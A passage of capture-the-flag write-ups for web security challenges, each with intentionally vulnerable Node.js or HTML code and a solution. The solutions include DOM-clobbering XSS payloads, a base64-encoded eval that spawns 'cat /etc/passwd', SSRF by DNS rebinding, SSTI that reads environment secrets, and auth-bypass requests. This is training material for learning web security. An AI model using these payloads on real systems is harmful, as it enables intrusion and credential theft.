  "userId": "670b0741-9fb1-4ef7-afe9-842120a12fcb"
}
```

<br />

The response:

```
[
  {
    "_id": "646be35936948f6269964fb5",
    "user_id": "670b0741-9fb1-4ef7-afe9-842120a12fcb",
    "company_id": "08131488-05a1-4bfd-abf7-b70191867ee6",
    "name": "Grandpa Joe",
    "secret": "54c48e5a-d98c-4bc7-8998-c55c577f9906"
  }
]
```



<br /><br />



### **#21: Menu Details**

**Goal:** Inject an alert("Wizer")

**Code:** 

```html
<html>
<head>
<title> Dashboard </title>
<script src="purify.min.js"></script>
</head>
<body>
    <h1>Dashboard</h1>

    <p> <span id="name">Guest</span>, Welcome to the Dashboard
    <a href="logout">Logout</a>
    </p>
    <p> <a href="profile">Profile</a> <span id="profileComment"></span></p>
    <p> <a href="settings">Settings</a> <span id="settingsComment"></span></p>
    <p> <a href="points">Points</a> (<span id="points">0</span>)</p>
    <p> <a href="leaderboard">Leaderboard</a></p>
</body>
<script>
    const urlParams = new URLSearchParams(window.location.search);
    for (var [key, value] of urlParams) {
        if(document.getElementById(key)) {
            document.getElementById(key).innerText = `${value}`;
        } else if (window.debugMode) {
            document.write("unidentified keys <br/>");
            document.write(`${key} = ${value} <br/>`);
        } else {
            key = DOMPurify.sanitize(key);
            document.write(`<span style='color: red'>${key} not found in the document</span><br/>`);
        }
    }
</script>
</html>
```

The code below demonstrates a simple app menu that integrates values from a URL, matched according to field name. The url arguments are fetched and iterated though. For every key in the querystring, if it finds an element where the id matches the key name then it embeds the value as innerText. In case it doesn't find the element, for non-debug mode, it purifies the key and prints a message that the key isn't found, however, when window.debugMode = true, both the key and value are printed without sanitization.

There are three issues with the code: (1) it enables debugMode using a global window argument which could be potentially shadowed by DOM Clobbering techniques, and (2) debugMode skips sanitization upon printing key/value, hence assuming you can activate this mode, you're able to print out HTML code including malicious scripts, and (3) An HTML injection is present when not in debug mode (Root cause of the DOM clobbering)

<br />

```
https://chal21-jknvdf2.vercel.app/dashboard.html?<div id="debugMode">=any&123=<script>alert("Wizer")</script>
```

**Note:** When submitting the flag, make sure to URL-encode it. If you submit it as-is, the key will be interpreted as `<div id`, and the value as `"debugMode>=any"`, which prevents the DOM clobbering from taking effect.

<br />

![](./assets/6.png)



<br />

![](./assets/7.png)



<br />

```
https://chal21-jknvdf2.vercel.app/dashboard.html?%3Cdiv%20id%3D%22debugMode%22%3E=any&123=%3Cscript%3Ealert(%22Wizer%22)%3C/script%3E
```



<br /><br />



### **#22: Calculator Level 2**

**Goal:** Read the content of the OS's `passwd` file

**Code:**

```javascript
const express = require('express')
const bodyParser = require('body-parser');
const app = express();
require('dotenv').config();

app.use(bodyParser.json());
const unauthorizedKeywords = ["spawn", "spawnSync", "process"];

const isValidInput = (input) => {
    invalid = false;
    unauthorizedKeywords.forEach((keyword) => {
        if (input.indexOf(keyword) > -1) {
            invalid = true;
        }
    });
    return !invalid;
}

app.post('/calc', async (req, res) => {
    try {
        let json = req.body;
        let calc = String(json.calculation);
        if (!isValidInput(calc)) {
            throw new Error("Invalid input");
        }   
        res.send(String(Function("return " + calc)()));
    } catch (e) {
        res.send(e.message);
        console.error(e.message);
    }
})

app.listen(process.env.port, () => {
    console.log(`API listening on PORT ${process.env.port}`)
})

module.exports = app
```

There are multiple ways to bypass the validation, one such way is to use a combination of `eval(atob())` which hides keywords that are being looked for. However, that's not enough since we can't use the `require` command anymore since it's not present on this version, but we could still use `process.binding` to import `fs` and then use the `.internalModuleReadJSON('/etc/passwd')`. Another way around the validation is to break unallowed words into parts and then concatenate them in the code. For instance, we could use `pro` and `cess.binding` to bypass the validation and run eval on the textual command in order to import `fs`.



<br /><br />



From: https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822

```javascript
// Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}

// Defines spawnSync, the function that will do the actual spawning
spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}

spawnSync('cat', ['/etc/passwd'])['output'][1];
```

<br />

```
{
  "calculation": "eval(atob('Ly8gRGVmaW5lcyBzcGF3bl9zeW5jIGFuZCBub3JtYWxpemVTcGF3bkFyZ3VtZW50cyAod2l0aG91dCBlcnJvciBoYW5kbGluZykuIFRoZXNlIGFyZSBpbnRlcm5hbCB2YXJpYWJsZXMuCnNwYXduX3N5bmMgPSBwcm9jZXNzLmJpbmRpbmcoJ3NwYXduX3N5bmMnKTsgbm9ybWFsaXplU3Bhd25Bcmd1bWVudHMgPSBmdW5jdGlvbihjLGIsYSl7aWYoQXJyYXkuaXNBcnJheShiKT9iPWIuc2xpY2UoMCk6KGE9YixiPVtdKSxhPT09dW5kZWZpbmVkJiYoYT17fSksYT1PYmplY3QuYXNzaWduKHt9LGEpLGEuc2hlbGwpe2NvbnN0IGc9W2NdLmNvbmNhdChiKS5qb2luKCcgJyk7dHlwZW9mIGEuc2hlbGw9PT0nc3RyaW5nJz9jPWEuc2hlbGw6Yz0nL2Jpbi9zaCcsYj1bJy1jJyxnXTt9dHlwZW9mIGEuYXJndjA9PT0nc3RyaW5nJz9iLnVuc2hpZnQoYS5hcmd2MCk6Yi51bnNoaWZ0KGMpO3ZhciBkPWEuZW52fHxwcm9jZXNzLmVudjt2YXIgZT1bXTtmb3IodmFyIGYgaW4gZCllLnB1c2goZisnPScrZFtmXSk7cmV0dXJue2ZpbGU6YyxhcmdzOmIsb3B0aW9uczphLGVudlBhaXJzOmV9O30KCi8vIERlZmluZXMgc3Bhd25TeW5jLCB0aGUgZnVuY3Rpb24gdGhhdCB3aWxsIGRvIHRoZSBhY3R1YWwgc3Bhd25pbmcKc3Bhd25TeW5jID0gZnVuY3Rpb24oKXt2YXIgZD1ub3JtYWxpemVTcGF3bkFyZ3VtZW50cy5hcHBseShudWxsLGFyZ3VtZW50cyk7dmFyIGE9ZC5vcHRpb25zO3ZhciBjO2lmKGEuZmlsZT1kLmZpbGUsYS5hcmdzPWQuYXJncyxhLmVudlBhaXJzPWQuZW52UGFpcnMsYS5zdGRpbz1be3R5cGU6J3BpcGUnLHJlYWRhYmxlOiEwLHdyaXRhYmxlOiExfSx7dHlwZToncGlwZScscmVhZGFibGU6ITEsd3JpdGFibGU6ITB9LHt0eXBlOidwaXBlJyxyZWFkYWJsZTohMSx3cml0YWJsZTohMH1dLGEuaW5wdXQpe3ZhciBnPWEuc3RkaW9bMF09dXRpbC5fZXh0ZW5kKHt9LGEuc3RkaW9bMF0pO2cuaW5wdXQ9YS5pbnB1dDt9Zm9yKGM9MDtjPGEuc3RkaW8ubGVuZ3RoO2MrKyl7dmFyIGU9YS5zdGRpb1tjXSYmYS5zdGRpb1tjXS5pbnB1dDtpZihlIT1udWxsKXt2YXIgZj1hLnN0ZGlvW2NdPXV0aWwuX2V4dGVuZCh7fSxhLnN0ZGlvW2NdKTtpc1VpbnQ4QXJyYXkoZSk/Zi5pbnB1dD1lOmYuaW5wdXQ9QnVmZmVyLmZyb20oZSxhLmVuY29kaW5nKTt9fWNvbnNvbGUubG9nKGEpO3ZhciBiPXNwYXduX3N5bmMuc3Bhd24oYSk7aWYoYi5vdXRwdXQmJmEuZW5jb2RpbmcmJmEuZW5jb2RpbmchPT0nYnVmZmVyJylmb3IoYz0wO2M8Yi5vdXRwdXQubGVuZ3RoO2MrKyl7aWYoIWIub3V0cHV0W2NdKWNvbnRpbnVlO2Iub3V0cHV0W2NdPWIub3V0cHV0W2NdLnRvU3RyaW5nKGEuZW5jb2RpbmcpO31yZXR1cm4gYi5zdGRvdXQ9Yi5vdXRwdXQmJmIub3V0cHV0WzFdLGIuc3RkZXJyPWIub3V0cHV0JiZiLm91dHB1dFsyXSxiLmVycm9yJiYoYi5lcnJvcj0gYi5lcnJvciArICdzcGF3blN5bmMgJytkLmZpbGUsYi5lcnJvci5wYXRoPWQuZmlsZSxiLmVycm9yLnNwYXduYXJncz1kLmFyZ3Muc2xpY2UoMSkpLGI7fQoKc3Bhd25TeW5jKCdjYXQnLCBbJy9ldGMvcGFzc3dkJ10pWydvdXRwdXQnXVsxXTs='))"
}
```



<br /><br />





### **#23: Request Processor**

**Goal:** Perform any valid request to get the flag

**Code:**

```javascript
const express = require('express')
const bodyParser = require('body-parser');
const performAction = require('./actions');
const app = express();
require('dotenv').config();
app.use(bodyParser.json());

app.post('/request', async (req, res) => {
    try {
        let json = req.body;
        let request = json.request;
        if(request) {
            // Request string format: "data:<data>,requestType:<requestType>,key:<key>," 
            const requestTypeIndex = request.indexOf("requestType:");
            const dataIndex = request.indexOf("data:");
            const keyIndex = request.indexOf("key:");
            const keyFound = keyIndex > 0;

            if(requestTypeIndex < 0 || dataIndex < 0 || keyIndex < 0) {
                res.status(401).send("Invalid request format: data:<data>,requestType:<requestType>,key:<key>,");
                return;
            } else if(keyFound) {
                key = request.substring(keyIndex + 4).substring(0, request.substring(keyIndex + 4).indexOf(","));
                if(key !== process.env.key) {
                    res.status(401).send("invalid key");
                    return;
                }
            }
            const requestType = request.substring(requestTypeIndex + 12).substring(0, request.substring(requestTypeIndex + 12).indexOf(","));
            const data = request.substring(dataIndex + 5).substring(0, request.substring(dataIndex + 5).indexOf(","));

            res.send(performAction(requestType, data));
            return;
        } else {
            res.status(401).send("missing request parameter");
            return;
        }
    } catch (e) {
        res.send(e.message);
        console.error(e.message);
    }
})

app.listen(process.env.port, () => {
    console.log(`API listening on PORT ${process.env.port}`)
})

module.exports = app
```

> The code below is of a custom Request Processor, which is a NodeJS application that processes custom formatted requests from the user. The expected structure of the request is as stated in the comment: "data:<data>,requestType:<requestType>,key:<key>,". Upon receiving the request, the code splits the request into its parts and validates the key against the secret stored. If the key matches the secret stored, then the action is performed (within an external code, not included in this challenge), otherwise, an "invalid key" error is returned. Furthermore, in the following part of the code, a validation was added to ensure the existence of all the required fields in the request, which returns an error "Invalid request format: data:<data>,requestType:<requestType>,key:<key>," if one of the fields is missing:

<br />

An oversight of a minor logic error, makes it possible to trick the system and get in the crack created between the valid and the invalid structures. There are two validations for key existence: (1) const keyFound = keyIndex > 0; which is used to protect the key validation process and (2) A check of `keyIndex < 0` within the part that checks if all the expected elements exist. But what if keyIndex is exactly 0? The logic isn't actually validating the particular expected order of the fields.

By providing the key as the first data field "key:xyz," in the request, the keyIndex will be 0, which means that we can pass the validation of existence and yet skip the verification of the key against the stored secret, since `keyIndex > 0` isn't true. This way, an attacker could perform any action without the key.

<br />

```
{
  "request": "key:xyz,data:ggg,requestType:ddd,"
}
```

<br />

**Debugging Code:**

```
// Request string format: "data:<data>,requestType:<requestType>,key:<key>," 
let request = "key:aaa,data:bbb,requestType:ccc,";
const requestTypeIndex = request.indexOf("requestType:");
const dataIndex = request.indexOf("data:");
const keyIndex = request.indexOf("key:");
const keyFound = keyIndex > 0;

console.log("keyIndex: ",keyIndex, "keyFound ", keyFound);
if(requestTypeIndex < 0 || dataIndex < 0 || keyIndex < 0) {
    console.log("Invalid request format: data:<data>,requestType:<requestType>,key:<key>,");
} else if(keyFound) {
    console.log("in else if");
    key = request.substring(keyIndex + 4).substring(0, request.substring(keyIndex + 4).indexOf(","));
    console.log("key: ",key);

    if(key !== "dhkwnkjdfnkjewnfwjbf") {
        console.log("invalid key");

    }
}
const requestType = request.substring(requestTypeIndex + 12).substring(0, request.substring(requestTypeIndex + 12).indexOf(","));
console.log("requestType: ", requestType);
const data = request.substring(dataIndex + 5).substring(0, request.substring(dataIndex + 5).indexOf(","));
console.log("data: ", data);
```

<br /><br />

### **#24: Company Logos Phase 2**

**Goal: **Get the list of CRM users from the internal network API

**Code:**

```javascript
import express from 'express';
const app = express();
const app2 = express();
import fs from 'fs';
import fetch from "node-fetch";
import bodyParser from 'body-parser';
app.use(bodyParser.json());
import dotenv from 'dotenv';
import { CRMUsers } from './crm.mjs';
dotenv.config();

const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

app.post('/getCompanyLogo', async (req, res) => {
    try {
        let json = req.body;
        let companyId = String(json.companyId);

        if(companyId != '' && companyId.match(uuidFormat)) {
            const data = fs.readFileSync(`${process.env.companyLogosFolder}/${companyId}`);
            res.send(data);
        }
        else res.send("invalid arguments provided");
    } catch (e) {
        res.send(e.message);
    }
})

const validURL = (ImageURL) => {
    try {
        const newUrl = new URL(ImageURL);
        const validServer =!(newUrl.hostname.includes('localhost')) && 
                           !(newUrl.hostname.startsWith('127')) &&
                           !(newUrl.hostname.startsWith('0'));
        return validServer && (newUrl.protocol === 'http:' || newUrl.protocol === 'https:');
    } catch (err) { return false; }
}

app.post('/setCompanyLogo', async (req, res) => {
    try {
        console.log("remote ip:" + requestIp.getClientIp(req));
        let json = req.body;
        let companyId = String(json.companyId);
        let imageUrl = validURL(json.imageUrl) ? json.imageUrl : '';

        if(companyId != '' && companyId.match(uuidFormat)) {
            const result = await fetch(imageUrl);
            fs.writeFileSync(`${process.env.companyLogosFolder}/${companyId}`, await result.text());
            res.sendStatus(200);
        }
        else res.send("invalid arguments provided");
    } catch (e) {
        res.send(e.message);
    }
})

app2.get('/CRMUsers', async (req, res) => {
    res.send(CRMUsers);
})

app.listen(process.env.port, () => {
    console.log(`API listening on PORT ${process.env.port}`)
})

// Internal service; accessible only from localhost on port 4001
app2.listen(4001, 'localhost', function() {
    console.log("Internal service started port %d in %s mode", 4001, app2.settings.env);
});
```



DNS Rebind attack:

An attacker who knows about the internal service and identifies the validation made, could use a DNS Rebind approach to exploit the SSRF vulnerability. Once they discover the `/CRMUsers` endpoint, they can then use a domain name which resolves as localhost cush as `spoofed.burpcollaborator.net`, hence store an "imageUrl": "http://[domain]/CRMUsers" using the `/setCompanyLogo` endpoint, which could then be executed upon invoking the `/getCompanyLogo` of the specific company ID stored.

<br />

![](./assets/8.png)



<br />

![](./assets/9.png)

<br />

```
POST /setCompanyLogo

{
  "companyId": "550e8400-e29b-41d4-a716-446655440001",
  "imageUrl": "http://x.fbi.com:4001/CRMUsers"
}

OR

{
  "companyId": "550e8400-e29b-41d4-a716-446655440001",
  "imageUrl": "http://spoofed.burpcollaborator.net:4001/CRMUsers"
}
```

<br />

```
POST /getCompanyLogo

{
  "companyId": "550e8400-e29b-41d4-a716-446655440001"
}
```



<br /><br />



### **#36: CRM USERS FILTER**

**Goal: **Get the full unfiltered list of CRM users using '/filterCRMUsers' endpoint and win the flag!

**Code:**

```javascript
import express from 'express';
import bodyParser from 'body-parser';
import { CRMUsers } from './crm.mjs';
const app = express();
app.use(bodyParser.json());
const availableFields = [
    // currently supported fields
    'id', 'firstName', 'lastName', 'phoneNumber', 
    'title', 'department', 'email',
    // additional fields to be supported in the future
    'address', 'city', 'state', 'zip', 'country'
];

function filter(items, field, value) {
	const filtered = [];
	for (let i = 0; i < items.length; ++i) { 
		if (items[i][field] === value) {
			filtered.push(items[i]);
		}
	}
	return filtered;
}

app.post('/filterCRMUsers', function(req, res) {
	let [field, value] = [req.body.field, req.body.value];
    // Validate the field
    if(!field?.trim()) {
        field = 'id';
    }
    if(!availableFields.includes(field)) {
        res.status(400).send(`Invalid field: ${field}`);
        return;
    }
	const results = filter(CRMUsers, field, value);
	res.json(results);
});

app.listen(3000);
console.log("Listening on port 3000");
```

<br />

we need to make this condition to be true to push the elements into the array and return them, so we will use one of the additional fields to be supported in the future (e.g. "city"), which means this value is "undefined". and in the body we will not add "value" parameter to be also "undefined". so the if condition will return true.

```json
{"field":"city","":""}
```





<br /><br />

### **#37: SUPPORT TICKET**

**Goal: ** Trick the user into inserting their username and password within a fake login page, show 'Dave, please login <a href="https://chal15.vercel.app">here</a> to open a ticket'

**Code:** 

```javascript
// code file: index.js
const helmet = require('helmet');
const crypto = require('crypto');
const express = require('express');
require('dotenv').config();
const app = express();
app.set('view engine', 'ejs');
const ejs = require('ejs');
const template = require('./main');

app.use((req, res, next) => {
    let nonce = crypto.randomBytes(16).toString('hex');
    res.locals.cspNonce = nonce; 
    next();
});

app.use(helmet({
    xFrameOptions: { action: 'deny' },
    contentSecurityPolicy: {
        directives: {
            'script-src': ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`]
        },
    },
}));

app.get('/main', async (req, res) => {
    try {
        res.send(ejs.render(template, {nonce: res.locals.cspNonce, name: req.query.name, phone: process.env.PHONE}));
    } catch (e) {
        console.error(e);
    }
})

app.listen(80, () => {
    console.log('Server is running on port 80');
});

// code file: main.js
const template = `<!DOCTYPE html><html>
    <head>
        <title>Help Center Support</title>
    </head>
    <body>
        <h2 id="title">Hello 
            <script nonce="<%=nonce%>">
                document.write((new URLSearchParams(window.location.search).get('name') || 'anonymous'));
            </script>, our support phone number is: <span id="phone"/>
        </h2>
        <script nonce="<%=nonce%>">
            document.getElementById('phone').innerHTML = `<span id="phone"><%=phone%></span>`;
        </script>

        <!-- Added for challenge validation purpose - fulfill the condition to get the flag! -->
        <script nonce="<%=nonce%>">
            if(document.documentElement.innerText.indexOf(
                'Dave, please login here to open a ticket') > 0 &&
               document.getElementsByTagName('A')[0].href === 'https://chal15.vercel.app/' &&
               document.documentElement.innerText.indexOf(
                'our support phone number is: <%=phone%>') < 0) {
                alert('Success!');  
            }
        </script>
    </body>
</html>`
```

<br />

we have XSS in the name parameter. but the csp blocks our script to be executed.

we need to 

1. insert this sentence in the page "Dave, please login here to open a ticket" 
2. insert the first `<a>` to be 'https://chal15.vercel.app/'
3. remove this sentence from the page 'our support phone number is:' 

to get the alert('Success!'); 

<br />

to achieve number 1,2 simply we can inject it in the name parameter

```
?name=Dave, please login <a href="https://chal15.vercel.app">here</a> to open a ticket
```

![](./assets/2.png)

<br />

to achieve number 3, we need to use DOM Clobbering to overwrite the span with the id=phone by inserting a new HTML element with id="phone"

![](./assets/3.png)

<br /><br />

![](./assets/4.png)



<br /><br />



![](./assets/5.png)

<br /><br />

```
?name=Dave, please login <a href="https://chal15.vercel.app">here</a> to open a ticket<a id=phone>
```



<br /><br />

### \#38: MY PROFILE NAME

**Goal:** Get `robertf` secret key and validate it with the /checkKeyValidity endpoint

**Code:**

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
require('dotenv').config();
const profiles = require('./profiles');
app.use(bodyParser.urlencoded({ extended: true })); 
app.use(bodyParser.json());
const ejs = require('ejs');

app.get('/profileName', async (req, res) => {
    try {
        const query = req.query;
        console.log(query);

        if (query.username) {
            const username = Array.isArray(query.username) ? query.username : [query.username];
            res.send({ "value": profileInternal(username, query.key, query.profileMessage) });
            return;
        }
        res.send(`No name provided`);
    } catch (e) {
        res.send(e.message);
        console.error(e.message);
    }
});

const profileInternal = (usernames, key, profileMessage) => {
    let filteredProfiles = [];
    let keyCheck = key === process.env.superAdminCode; 

    // If multiple usernames are provided, handle them differently and require the key to be valid
    // or a valid super admin code
    if (Array.isArray(usernames) && usernames.length > 1) {
        for (let i = 0; i < usernames.length; i++) {
            let username = usernames[i];
            const profileInfo = profiles.find(profile => profile.username === username);
            
            if (profileInfo) {
                keyCheck ||= (key ? profileInfo.key === key : false);
                if (keyCheck) filteredProfiles.push(profileInfo);
            }
        }
        return filteredProfiles.length && keyCheck ? filteredProfiles : keyCheck ? 'no-matching-profiles' : "Invalid key";
    } else {
        let username = usernames[0];
        let profileInfo = profiles.find(profile => profile.username === username);

        // Validate the key only if provided
        if (key && profileInfo) {        
            return profileInfo.key === key ? profileInfo : 'Invalid key';
        }
        if(profileMessage) {
            return renderProfile(profileMessage, profileInfo.name);
        }
        return profileInfo ? profileInfo.name : 'profile-not-found';
    }
};

app.post('/checkKeyValidity', async (req, res) => {
    try {
        const { username, key } = req.body;
        res.send({ "valid": profiles.find(
            profile => (profile.username === username && profile.key === key)
        ) ? true : false }); 
    } catch (e) {
        res.send(e.message);
        console.error(e.message);
    }
});

// Template rendering function
// Example of a template: "Hello, <%= name %>!"
const renderProfile = (template, name) => {
    // List of disallowed keywords to prevent template injection
    const forbiddenKeywords = [
        "process", "eval", "require", "profiles",  
        "exec", "spawn", "fork", "child", "execFile", 
        "execSync", "execFileSync", "atob", "("
    ];

    // Check if any forbidden keyword is present in the template
    const hasForbiddenKeywords = forbiddenKeywords.some(keyword => template.includes(keyword));

    if (!hasForbiddenKeywords) {
        // Render the template safely
        const message = ejs.render(template, { name });

        // Profile keys start with '!!!' to indicate sensitive data
        // Check if the rendered message contains sensitive markers
        if (!message.includes('!!!')) {
            return message;
        }
    }
    
    // Fallback if the template is unsafe or contains sensitive data
    return name;
};

app.listen(process.env.port, () => {
    console.log(`API listening on PORT ${process.env.port}`);
});

module.exports = app;
```

There are two issues in the code. The first issue is that it assumes that an array type `username` argument cannot be provided as the querystring parameter, and that's a wrong assumption. The second issue is that using a ejs template engine to render the message straight from the user-input is not safe, as it can be exploited to inject code.

<br />

First, the attacker would exploit the SSTI vulnerability using the `profileName` endpoint by providing the username `robertf` (known to exist based on the challenge's instructions). The `profileMessage` would include an escaped form of a new variable within the EJS format of <%= some-var %> to steal the value of the environment variable named `superAdminCode`. Escaping is critical since this API endpoint uses a GET request. Since many useful keywords are forbidden by the code, one way to bypass the validation would be `globalThis["p"+"rocess"]` OR `global["p"+"rocess"]`.

<br />

encode the url with URL encoding 

```
GET /profileName?username=robertf&profileMessage=Hello <%= name %> <%= global["p"+"rocess"]["env"]["PWD"] %> 
```

The response will be

````
{"value":"Hello Robert Frank /var/task"}
````

<br />

To get the superAdminCode

```
GET /profileName?username=robertf&profileMessage=Hello <%= name %> <%= globalThis["p"+"rocess"]["env"]["superAdminCode"] %>
```

The response will be

```
{"value":"Hello Robert Frank 784HDHASJJ3489JJFKSJ"}
```

To get the robertf key: we need to get the data from this line

```javascript
return filteredProfiles.length && keyCheck ? filteredProfiles : keyCheck ? 'no-matching-profiles' : "Invalid key";
```

So we need to send array of usernames one of them is "robertf "

<br />

```
GET /profileName?username[0]=robertf&username[1]=admin&key=784HDHASJJ3489JJFKSJ
```

The response will be

```javascript
{"value":[{"username":"robertf","name":"Robert Frank","id":"11009","key":"!!!6g44534i8j4589gj90kg5"}]}
```

<br />

Then validate the key

```
POST /checkKeyValidity


{"username":"robertf","key":"!!!6g44534i8j4589gj90kg5"}
```



<br /><br />



### \#39: CHATROOM

```javascript
const socket = io();

const messages = document.getElementById('messages');
const chatForm = document.getElementById('chat-form');
const usernameInput = document.getElementById('username');
const iconInput = document.getElementById('icon');
const messageInput = document.getElementById('message');
const urlParams = new URLSearchParams(window.location.search);

chatForm.addEventListener('submit', (e) => {
  e.preventDefault();
  const user = usernameInput.value.trim();
  const icon = iconInput.value; // Get selected icon value
  const text = messageInput.value.trim();
  if (!user || !text) return;
  socket.emit('chat message', { user, icon, text });
  messageInput.value = '';
});

socket.on('message', (msg) => {
  const user = msg.user;
  const text = msg.text;
  let icon = msg.icon;
  if (icon.emoji == "") {
    icon = window.defaultIcon || {"emoji": "🏴"}
  }

  const messageElement = document.createElement('div');
  messageElement.classList.add('message');
  const displayName = icon ? `${icon.emoji} ${user}` : user;
  messageElement.innerHTML = `<strong>${displayName}:</strong> ${text}`;
  messages.appendChild(messageElement);
  messages.scrollTop = messages.scrollHeight; // Auto-scroll to the latest message
});

const queryMessages = urlParams.get('messages')?.split(',') || [];
usernameInput.value = urlParams.get('username') || usernameInput.value;

for (let i = 0; i < queryMessages.length; i++) {
  messageInput.value = queryMessages[i];
  chatForm.dispatchEvent(new Event('submit'));
}
```

The defaultIcon variable is stored on the window object, and hence is vulnerable for over-shadowing a.k.a. DOM Clobbering.

In looking at the following code, the defaultIcon is being used whenever the `icon.emoji` property is empty

This means that an attacker would need to skip the icon initially. Since the code does not offer an option to provide an icon, it is easy for the attacker to craft a URL to trigger the exploit. The attacker would then create a URL to overshadow the defaultIcon variable with a new element using DOM Clobbering. But how would the attacker fill the emoji property with a malicious script? The goal here is to print out a tag that will make `window.defaultIcon.emoji` include some malicious script. Fortunately for the attacker, it is possible to overshadow inner properties by adding another element with a property named `emoji` on it. Something like this: (non-escaped form): `<a id=defaultIcon><a id=defaultIcon name=emoji href="cid:<img src=x onerror=alert('HACKED')>">` Finally, to trigger an alert with the word `HACKED`, the attacker could post another dummy message (using the same URL - comma separated) under any username, which will execute the script.

```
https://chal39-rfh85-a4e8a8b41487.herokuapp.com/?username=1&messages=<a id=defaultIcon><a id=defaultIcon name=emoji href="cid:<img src=x onerror=alert('HACKED')>">,123
```





### #40: **API GATEWAY #2**

**Goal:** Get Grandpa Joe's user record (Id:670b0741-9fb1-4ef7-afe9-842120a12fcb) from the API

**Code**

```javascript
import express from 'express';
const app = express();
const app2 = express();
import bodyParser from 'body-parser';
app.use(bodyParser.json());
app2.use(bodyParser.json());
import dotenv from 'dotenv';
import { CRMEntities } from './crm.mjs';
import axios from 'axios';
import { MongoClient } from 'mongodb';
dotenv.config();
const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
const requireAuthentication = ['getuser', 'getcompany'];
const allowedVerbs = ['GET', 'POST'];

app.post('/callApi', async (req, res) => {
    let json = req.body;
    let api = String(json.api)?.trim();
    let apiName = api.indexOf('.') >= 0  ? api.substring(0, api.lastIndexOf('.')) : api;
    apiName = apiName.replaceAll('/', '').replaceAll('#', '').replaceAll('?', '');
    let verb  = json.api.substring(json.api.lastIndexOf('.') + 1);
    // default to POST if no verb is provided
    if(verb === apiName) {
        verb = 'POST';
    }
    console.log("api:", apiName, "verb:", verb);

    let token = json.token;
    let response;
    try {
        if (requireAuthentication.includes(apiName.toLowerCase())) {
            if(!allowedVerbs.includes(verb)) {
                res.send("Invalid verb");
                return;
            }
            if (token == process.env.tokenSecret) {
                switch (verb) {
                    case 'GET':
                        response = await axios.get(`http://localhost:${process.env.internalPort}/${apiName}`);
                        res.send(response.data);
                        break;
                    case 'POST':
                        response = await axios.post(`http://localhost:${process.env.internalPort}/${apiName}`, json);
                        res.send(response.data);
                        break;
                    default:
                        res.send("Invalid verb");  
                }
            } else {
                res.send("Invalid token");
            }  
        } else {
            // remove the verb from the api and default to POST
            apiName = api.replaceAll('.POST', '').replaceAll('.GET', '');
            const response = await axios.post(`http://localhost:${process.env.internalPort}/${apiName}`, json);
            res.send(response.data);
        }
    } catch(e) {
        res.status(500).end(e.message);
        console.error(e.message);
    }
});

app2.post('/getUser', async (req, res) => {
    const client = new MongoClient(process.env.MONGODB_URI);
    try {
        const userId = req.body.userId;
        if(typeof(req.body) === 'object' && userId && userId.match(uuidFormat)) {
            await client.connect();
            const db = client.db("challenge_5");
            const user = await db
                .collection("users")
                .find({ user_id: userId }) 
                .maxTimeMS(5000)
                .toArray()
            console.log(user);
            res.send(JSON.stringify(user));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    } finally {
        await client.close();
    }
})

app2.post('/getCompanies', async (req, res) => {
    const client = new MongoClient(process.env.MONGODB_URI);
    try {
        const companyId = req.body.companyId;
        if(typeof(req.body) === 'object' && companyId && companyId.match(uuidFormat)) {
            await client.connect();
            const db = client.db("challenge_5");
            const company = await db
                .collection("companies")
                .find({ company_id: companyId })
                .maxTimeMS(5000)
                .toArray();
            console.log(company);
            res.send(JSON.stringify(company));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    } finally {
        await client.close();
    }
})

app2.post('/CRMEntities', async (req, res) => {
    res.send(CRMEntities);
})

app.listen(process.env.externalPort, () => {
    console.log(`External API listening on PORT ${process.env.externalPort} `)
})

// Internal service; accessible only from localhost
app2.listen(process.env.internalPort, 'localhost', function() {
    console.log(`Internal service started port ${process.env.internalPort}`);
});
```





```json
{
  "api": "getUser/ .GET",
  "userId": "670b0741-9fb1-4ef7-afe9-842120a12fcb"
}
```



**Debugging code:**

```javascript
const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
const requireAuthentication = ['getuser', 'getcompany'];
const allowedVerbs = ['GET', 'POST'];

let json = {"api":"getUser/ .GET"};
let api = String(json.api)?.trim();
console.log("api: ", api);
let apiName = api.indexOf('.') >= 0  ? api.substring(0, api.lastIndexOf('.')) : api;
console.log("apiName: ", apiName);
apiName = apiName.replaceAll('/', '').replaceAll('#', '').replaceAll('?', '');
